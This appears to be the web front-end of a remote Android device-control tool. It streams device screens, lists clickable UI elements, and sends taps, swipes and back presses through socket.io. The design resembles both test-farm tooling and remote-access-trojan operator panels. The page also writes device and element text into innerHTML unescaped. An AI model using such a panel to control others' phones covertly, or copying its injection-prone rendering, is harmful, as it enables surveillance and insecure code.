<!DOCTYPE html>
<html>
<head>
    <title>üîç Layout Inspector Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e); 
            color: #00ff88; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 10px; left: 10px; 
            background: rgba(0,20,40,0.95); padding: 15px; 
            max-height: 80vh; overflow-y: auto; width: 280px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #00ff88;
        }
        .device { padding: 12px; margin: 8px 0; background: rgba(0,50,100,0.8); 
            cursor: pointer; border-radius: 10px; transition: all 0.3s; 
            border-left: 4px solid #00ff88; }
        .device:hover { background: rgba(0,100,150,0.9); transform: translateX(5px); }
        .active { background: linear-gradient(45deg, #00ff88, #00cc66) !important; 
            color: #000; box-shadow: 0 0 20px #00ff88; }

        #phone-frame {
            width: 420px; height: 900px; margin: 20px auto; 
            background: linear-gradient(145deg, #1a1a2e, #16213e); 
            border: 30px solid #0f0f23; border-radius: 60px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 30px 60px rgba(0,0,0,0.8), inset 0 0 20px rgba(0,255,136,0.1);
        }
        #screen { 
            width: 100%; height: 100%; border-radius: 30px;
            background: #000; image-rendering: optimizeSpeed;
        }
        #element-list {
            position: fixed; right: 10px; top: 10px; 
            background: rgba(0,20,40,0.95); padding: 15px; 
            max-height: 70vh; overflow-y: auto; width: 300px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #ffaa00;
        }
        .element { padding: 8px; margin: 5px 0; background: rgba(255,170,0,0.1); 
            border-radius: 8px; font-size: 12px; cursor: pointer; border-left: 3px solid #ffaa00; }
        .element:hover { background: rgba(255,170,0,0.3); }
        .clickable { border-left-color: #00ff88 !important; }
        #status { position: fixed; top: 10px; right: 340px; background: rgba(0,0,0,0.8); 
            padding: 12px; border-radius: 8px; font-size: 14px; }
        #controls { text-align: center; position: fixed; bottom: 20px; 
            left: 50%; transform: translateX(-50%); }
        button {
            padding: 15px 25px; margin: 0 8px; background: linear-gradient(45deg, #ff6b35, #f7931e); 
            color: white; border: none; border-radius: 25px; cursor: pointer; 
            font-size: 16px; font-weight: bold; transition: all 0.3s;
            box-shadow: 0 5px 20px rgba(255,107,53,0.4);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 8px 30px rgba(255,107,53,0.6); }
    </style>
</head>
<body>
    <div id="devices">
        <h3>üì± Devices</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="element-list">
        <h4>üéØ Clickable Elements</h4>
        <div id="clickable-list">Select device...</div>
    </div>
    
    <div id="status">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Elements: <span id="elementCount">0</span> | 
            Device: <span id="selectedDevice">-</span></div>
    </div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="toggleFullScreen()">üì± Fullscreen</button>
        <button onclick="clearElements()">üóëÔ∏è Clear List</button>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2400;
        let currentElements = [];
        let lastFrameTime = 0, frameCount = 0;

        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const clickableList = document.getElementById('clickable-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDeviceSpan = document.getElementById('selectedDevice');
        const fpsDisplay = document.getElementById('fps');
        const elementCount = document.getElementById('elementCount');

        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ Connected';
            connectionStatus.style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        // üî• LAYOUT FRAME HANDLING
        socket.on('layout-frame', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            deviceWidth = data.width;
            deviceHeight = data.height;
            currentElements = data.elements || [];
            
            updateElementList();
            
            const img = new Image();
            img.onload = () => {
                const rect = phoneFrame.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                
                ctx.imageSmoothingEnabled = false;
                ctx.drawImage(img, 0, 0, rect.width, rect.height);
                
                // FPS counter
                frameCount++;
                const now = performance.now();
                if (now - lastFrameTime >= 1000) {
                    fpsDisplay.textContent = Math.round(frameCount * 1000 / (now - lastFrameTime));
                    elementCount.textContent = currentElements.length;
                    frameCount = 0;
                    lastFrameTime = now;
                }
            };
            img.src = 'data:image/jpeg;base64,' + data.data;
        });

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.map(([id, info]) => `
                <div class="device ${!info.connected ? 'disconnected' : ''}" 
                     onclick="selectDevice('${id}', this)">
                    <b>${info.model || id.slice(0,8)}</b><br>
                    <small>${info.brand || ''} ${info.version || ''}</small>
                    ${info.status === 'layout-active' ? 'üîç LAYOUT' : 'üü¢ LIVE'}
                </div>
            `).join('') || 'No devices';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDeviceSpan.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            socket.emit('control', { deviceId });
            clickableList.innerHTML = 'Loading layout...';
        }

        function updateElementList() {
            const clickable = currentElements.filter(el => el.clickable);
            clickableList.innerHTML = clickable.map((el, i) => {
                const text = el.text.replace(/[\n\r\t]/g, ' ').trim();
                return `
                    <div class="element clickable" onclick="clickElement(${i})" title="${el.className}">
                        <b>${text || '[No Text]'}</b><br>
                        <small>X:${el.bounds.left}-${el.bounds.right} Y:${el.bounds.top}-${el.bounds.bottom}</small>
                    </div>
                `;
            }).join('') || '<i>No clickable elements</i>';
        }

        function clickElement(index) {
            const el = currentElements[index];
            if (el && el.clickable && currentDevice) {
                const x = (el.bounds.left + el.bounds.right) / 2;
                const y = (el.bounds.top + el.bounds.bottom) / 2;
                socket.emit('control', { 
                    deviceId: currentDevice, 
                    action: 'tap', 
                    x, y 
                });
                console.log(`Clicked element ${index}:`, el.text, x, y);
            }
        }

        // Coordinate scaling
        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // Touch/Mouse controls
        let startX = 0, startY = 0, dragging = false;
        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                dragging = true;
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                startX = coords.x; startY = coords.y;
                socket.emit('control', { 
                    deviceId: currentDevice, 
                    action: 'tap', 
                    x: coords.x, y: coords.y 
                });
            });
        });

        ['mousemove', 'touchmove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!dragging || !currentDevice) return;
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                socket.emit('control', { 
                    deviceId: currentDevice, 
                    action: 'swipe', 
                    startX, startY, endX: coords.x, endY: coords.y 
                });
            });
        });

        ['mouseup', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, e => dragging = false);
        });

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        function clearElements() {
            clickableList.innerHTML = 'List cleared';
        }
    </script>
</body>
</html>
